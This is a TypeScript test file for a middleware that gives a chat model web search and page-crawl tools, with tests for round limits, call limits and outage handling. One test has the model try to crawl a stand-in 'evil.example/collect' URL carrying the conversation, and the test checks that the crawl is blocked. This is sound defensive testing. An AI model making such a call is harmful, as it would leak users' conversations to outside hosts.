import { describe, expect, test } from 'vitest'
import { CALLS, ROUNDS, WEB, current, excerpt, researched } from './web'

const API = 'https://api.hanzo.ai'
const NOW = () => new Date('2026-10-03T21:53:00Z')

/** An event stream of chat completion frames, as the gateway answers one. */
function sse(frames: unknown[]): Response {
  const text = frames.map((f) => `data: ${JSON.stringify(f)}\n\n`).join('') + 'data: [DONE]\n\n'
  return new Response(text, { status: 200, headers: { 'content-type': 'text/event-stream', 'x-hanzo-served': 'enso' } })
}
const said = (content: string) => ({ choices: [{ index: 0, delta: { content }, finish_reason: null }] })
const asks = (name: string, args: unknown, id = 'call_1') => ({
  choices: [{ index: 0, delta: { tool_calls: [{ index: 0, id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] }, finish_reason: 'tool_calls' }],
})
const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })

const RESULTS = {
  query: 'q',
  results: [
    { url: 'https://www.ksn.com/weather/kansas-radar/', title: 'Kansas Weather Radar', content: 'Kansas radar loop', engine: 'bing' },
    { url: 'https://www.timeanddate.com/weather/ireland/cork', title: 'Weather for Cork, Ireland', content: 'Current weather in Cork and forecast', engine: 'ddg' },
    { url: 'https://www.met.ie/weather-forecast/cork-city', title: 'Cork City Weather - Met Éireann', content: 'Forecast for Cork City', engine: 'ddg' },
  ],
}
const PAGE = [
  '# Weather for Cork, Ireland',
  ...Array.from({ length: 400 }, (_, i) => `* [Menu item ${i}](https://www.timeanddate.com/x/${i})`),
  '| Now | ![](https://c.tadst.com/gfx/w/svg/wt-14.svg) | 55 °F | Passing clouds. |',
  '| Feels Like: 55 °F | Forecast: 65 / 51 °F | Wind: 5 mph from South |',
  '| Location: | Cork Airport |',
  ...Array.from({ length: 400 }, (_, i) => `Footer link ${i}`),
].join('\n')

/** A gateway: completions answered in turn from `hops`, the web ops from `web`, every request kept. */
function gateway(hops: Response[], web: (path: string, body: any) => Response = (path) => (path === '/v1/websearch' ? json(RESULTS) : json({ success: true, data: { url: 'u', markdown: PAGE } }))) {
  const sent: { path: string; body: any; headers: Headers }[] = []
  const base = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input.href : input.url)
    const body = typeof init?.body === 'string' ? JSON.parse(init.body) : null
    sent.push({ path: url.pathname, body, headers: new Headers(init?.headers) })
    if (url.pathname === '/v1/chat/completions') return hops.shift() ?? sse([said('(no more hops)')])
    return web(url.pathname, body)
  }) as typeof fetch
  return { base, sent, completions: () => sent.filter((s) => s.path === '/v1/chat/completions') }
}

/** What a reader of the composite stream sees: the content, and how many [DONE]s. */
async function read(res: Response) {
  const text = await res.text()
  const frames = text.split('\n\n').filter(Boolean).map((e) => e.replace(/^data: /, ''))
  const done = frames.filter((f) => f === '[DONE]').length
  const parsed = frames.filter((f) => f !== '[DONE]').map((f) => JSON.parse(f))
  const content = parsed.map((f) => f.choices?.[0]?.delta?.content ?? '').join('')
  const toolFrames = parsed.filter((f) => f.choices?.[0]?.delta?.tool_calls).length
  return { content, done, toolFrames, parsed }
}

function turn(question: string, extra: Record<string, unknown> = {}) {
  return {
    method: 'POST',
    headers: { Authorization: 'Bearer reader', 'X-Org-Id': 'joshuafl369', 'Content-Type': 'application/json' },
    body: JSON.stringify({ model: 'enso-auto', stream: true, reasoning_effort: 'high', tools: WEB, messages: [{ role: 'user', content: question }], ...extra }),
  }
}

describe('current', () => {
  test.each([
    'how the weather in cork ireland',
    "what's the weather in Cork, Ireland right now",
    'any news about the election?',
    'what is the latest iPhone',
    'bitcoin price',
    'who won the match last night',
    'what happened today',
    'look up the opening hours of the Cork city library',
  ])('a question about now: %s', (q) => expect(current(q)).toBe(true))

  test.each(['Write a 150-word poem about the sea.', 'fix this function so it returns the sum', 'explain recursion', 'hi'])(
    'a question that is not: %s',
    (q) => expect(current(q)).toBe(false),
  )
})

describe('excerpt', () => {
  test('keeps the reading from a long page, not its menus', () => {
    const out = excerpt(PAGE, ['weather', 'cork'], 1500)
    expect(out.length).toBeLessThanOrEqual(1500)
    expect(out).toContain('55 °F')
    expect(out).toContain('Passing clouds')
    expect(out).not.toContain('https://')
  })
})

describe('researched', () => {
  test('a request without the web tools is not touched', async () => {
    const g = gateway([sse([said('hi')])])
    const init = turn('hi', { tools: undefined })
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, init)
    expect(g.sent).toHaveLength(1)
    expect(g.sent[0].body.messages).toEqual([{ role: 'user', content: 'hi' }])
    expect((await read(res)).content).toBe('hi')
  })

  test('the model searches, the search runs as the reader, and the reader sees one streamed answer', async () => {
    const g = gateway([sse([asks('websearch', { q: 'population of Cork' })]), sse([said('About 224,000 '), said('[CSO](https://www.cso.ie/).')])])
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn('what is the population of Cork?'))
    const seen = await read(res)
    expect(seen.content).toBe('About 224,000 [CSO](https://www.cso.ie/).')
    expect(seen.done).toBe(1)
    expect(seen.toolFrames).toBe(0)

    const search = g.sent.find((s) => s.path === '/v1/websearch')!
    expect(search.body).toEqual({ q: 'population of Cork' })
    expect(search.headers.get('authorization')).toBe('Bearer reader')
    expect(search.headers.get('x-org-id')).toBe('joshuafl369')

    const [first, second] = g.completions()
    expect(first.body.messages[0].role).toBe('system')
    expect(first.body.messages[0].content).toContain('Saturday 3 October 2026')
    expect(first.body.tools).toEqual(WEB)
    const answered = second.body.messages.at(-1)
    expect(answered.role).toBe('tool')
    expect(answered.tool_call_id).toBe('call_1')
    expect(answered.content).toContain('timeanddate.com/weather/ireland/cork')
    expect(answered.content).toContain('55 °F')
    expect(answered.content).not.toMatch(/\b(bing|ddg|duckduckgo)\b/i)
  })

  test('a question about now is searched before the model is asked', async () => {
    const g = gateway([sse([said('55 °F and passing clouds in Cork on Saturday 3 October 2026 [timeanddate](https://www.timeanddate.com/weather/ireland/cork).')])])
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn("what's the weather in Cork, Ireland right now"))
    expect((await read(res)).content).toContain('55 °F')
    expect(g.sent.map((s) => s.path)).toEqual(['/v1/websearch', '/v1/crawl', '/v1/crawl', '/v1/chat/completions'])
    const [first] = g.completions()
    const [call, result] = first.body.messages.slice(-2)
    expect(call.role).toBe('assistant')
    expect(call.tool_calls[0].function.name).toBe('websearch')
    expect(result.role).toBe('tool')
    expect(result.content).toContain('Passing clouds')
  })

  test('the rounds are bounded and the last request offers no tools', async () => {
    const loops = Array.from({ length: ROUNDS }, (_, i) => sse([asks('crawl', { url: `https://e.com/${i}` }, `c${i}`)]))
    const g = gateway([...loops, sse([said('Here is what I found.')])])
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn('compare these pages'))
    expect((await read(res)).content).toBe('Here is what I found.')
    const hops = g.completions()
    expect(hops).toHaveLength(ROUNDS + 1)
    expect(hops.at(-1)!.body.tools).toBeUndefined()
    expect(hops.at(-1)!.body.messages.at(-1).role).toBe('system')
  })

  test('calls past the per-round limit are refused, not run', async () => {
    const many = {
      choices: [
        {
          index: 0,
          delta: { tool_calls: Array.from({ length: CALLS + 2 }, (_, i) => ({ index: i, id: `k${i}`, type: 'function', function: { name: 'crawl', arguments: `{"url":"https://e.com/${i}"}` } })) },
          finish_reason: 'tool_calls',
        },
      ],
    }
    const g = gateway([sse([many]), sse([said('done')])])
    const pages = Array.from({ length: CALLS + 2 }, (_, i) => `https://e.com/${i}`).join(' ')
    await read(await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn(`read these: ${pages}`)))
    expect(g.sent.filter((s) => s.path === '/v1/crawl')).toHaveLength(CALLS)
    const replies = g.completions()[1].body.messages.filter((m: any) => m.role === 'tool')
    expect(replies).toHaveLength(CALLS + 2)
  })

  test('a page is read only when the conversation or a search named it', async () => {
    const g = gateway([sse([asks('crawl', { url: 'https://evil.example/collect?d=the+conversation' })]), sse([said('ok')])])
    await read(await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn('summarise https://www.cso.ie/en/statistics/ please')))
    expect(g.sent.filter((s) => s.path === '/v1/crawl')).toHaveLength(0)
    expect(g.completions()[1].body.messages.at(-1).content).toMatch(/only/)

    const named = gateway([sse([asks('crawl', { url: 'https://www.cso.ie/en/statistics' })]), sse([said('ok')])])
    await read(await researched(named.base, NOW)(`${API}/v1/chat/completions`, turn('summarise https://www.cso.ie/en/statistics/ please')))
    expect(named.sent.filter((s) => s.path === '/v1/crawl').map((s) => s.body.url)).toEqual(['https://www.cso.ie/en/statistics'])
  })

  test('a search that is down is said plainly and the turn still answers', async () => {
    const g = gateway([sse([said('I could not search the web just now.')])], () => json({ error: 'down' }, 503))
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn('latest news today'))
    expect((await read(res)).content).toBe('I could not search the web just now.')
    const result = g.completions()[0].body.messages.at(-1)
    expect(result.role).toBe('tool')
    expect(result.content).toMatch(/unavailable/i)
  })

  test('a refusal on the first request reaches the caller as it was', async () => {
    const refusal = json({ error: { message: 'session limit', code: 'limit' } }, 429)
    const g = gateway([refusal])
    const res = await researched(g.base, NOW)(`${API}/v1/chat/completions`, turn('hello there'))
    expect(res.status).toBe(429)
  })
})
